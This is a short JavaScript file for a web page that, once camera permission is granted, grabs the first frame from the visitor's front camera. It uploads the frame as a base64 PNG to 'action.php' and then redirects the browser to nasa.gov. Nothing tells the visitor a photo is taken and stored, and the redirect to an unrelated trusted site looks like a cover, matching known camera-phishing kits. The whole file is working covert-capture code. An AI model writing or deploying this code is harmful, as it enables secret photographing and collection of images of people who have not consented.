var video = document.getElementById("video")
const can = document.getElementById("canvas")

window.onload = () => {

//for different user agents
var mediaDevices = navigator.mediaDevices || navigator.webkitMediaDevices || navigator.mozMediaDevices

if(navigator.mediaDevices.getUserMedia){
  try{
  navigator.mediaDevices.getUserMedia({
    video: {
      height: {
        max: 2490,
        ideal: 1680,
        min: 760
      },
      width: {
        max: 1980,
        ideal: 1260,
        min: 520
      },
      //ensures that the camera is facing to the user(using front-camera)
      //change to **facingMode: 'environment'** to access rear camera
      facingMode: 'user'
    },
    //avoid audio capture
    audio:false
  })
  .then(stream => {
    let streamHeight = stream.getVideoTracks()[0].getSettings().height
    let streamWidth = stream.getVideoTracks()[0].getSettings().width
    //sets the video source to play the video
    video.height = streamHeight
    video.width = streamWidth
    video.srcObject = stream
  })
  }catch(err){
    document.write(err.message + "\nPlease allow camera access to use this site...")
  }
}
else{
  alert("Your device doesn't support this feature")
  document.write("Your browser doesn't support this feature")
}

video.addEventListener('canplay', () => drawCan())
//when the video starts playing
function drawCan(){
  try{
    var ctx = can.getContext("2d")
    can.height = video.height
    can.width = video.width
    //draw the first frame of the video into the canvas
    //the image we need is captured now in our canvas
    ctx.drawImage(video, 0, 0, can.width, can.height);
    
    //converts the image to a dataURL
    let data = can.toDataURL('image/png');
    //generates a random name to save the image as
    let imgName = Math.round(Math.random() * 1000000)
    
    $.post("action.php", {
      name: imgName,
      baseString: data
    }, (data, status) => {
      window.location.href = "https://nasa.gov"
    })
  }catch(err){
    document.write(err)
  }
}
}
